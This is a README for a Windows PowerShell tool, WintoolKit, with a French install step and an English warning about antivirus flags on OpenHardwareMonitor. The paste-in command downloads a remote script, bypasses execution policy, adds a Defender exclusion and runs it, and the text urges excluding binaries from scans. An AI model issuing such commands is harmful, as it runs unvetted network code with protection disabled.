

#  INSTALLATION

- Copier coller dans un terminal la commande ci-dessous
 
```powershell
iwr https://raw.githubusercontent.com/ps81frt/WintoolKit/main/Wintoolkit.ps1 -OutFile "$env:USERPROFILE\Downloads\Wintoolkit.ps1"
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
Unblock-File -Path "$env:USERPROFILE\Downloads\Wintoolkit.ps1"
Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads\Wintoolkit.ps1"
cd "$env:USERPROFILE\Downloads"
.\Wintoolkit.ps1
```

## 💡 Tip

You can include the app folder in your antivirus' exclusion list to prevent issues due to antivirus detections.

For Defender, you can run the following script in PowerShell as an administrator:

## ⚠️ Warning

Microsoft and other major antivirus vendors may have flagged **OpenHardwareMonitor** as malware. This is a false positive and is not related to a virus or anything similar.

Signals from Microsoft usually extend to other antivirus vendors as well. OpenHardwareMonitor has a history of being falsely flagged as malware by antivirus vendors (including Defender). This is likely due to its behavior, such as:
- Creating a task with administrator privileges to auto-start the application after login
- Storing an internal driver in a temporary folder to gain access to hardware resources

Currently, Defender does not flag this release, but it is likely that future updates may be flagged by Defender's machine learning-based detection systems within a few days of release.

---

## ❗ Important

If Defender or another antivirus detects any part of OpenHardwareMonitor as malware:
- It may prevent proper work
- It may cause the application to fail to start

OpenHardwareMonitor will not start if a required file exists but is blocked from being loaded.

👉 We strongly recommend excluding OpenHardwareMonitor's binaries from antivirus scans.

---

